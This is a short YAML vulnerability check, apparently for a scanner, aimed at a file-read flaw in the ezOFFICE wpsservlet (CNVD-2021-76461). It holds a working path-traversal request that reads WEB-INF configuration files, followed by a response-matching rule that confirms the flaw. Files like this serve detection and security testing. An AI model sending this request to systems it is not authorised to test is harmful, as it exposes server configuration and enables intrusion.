name: poc-yaml-ezoffice-wpsservlet-cnvd-2021-76461-readfile
binding: 74d11363-391d-4058-b2b9-a5cfdebc736c
manual: true
detail:
    author: iak3ec(https://github.com/nu0l)
    links:
        - https://www.whir.net/
    vulnerability:
        id: CT-530344
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /defaultroot/wpsservlet?option=loadFile&docId=web&dir=../WEB-INF&fileType=.xml
        expression: response.status == 200 && response.body.bcontains(bytes("defaultroot")) && response.body.bcontains(bytes("DownloadCheckFilter")) && response.body.bcontains(bytes("web-app")) && response.headers["Set-Cookie"].contains("OASESSIONID=")
expression: r0()
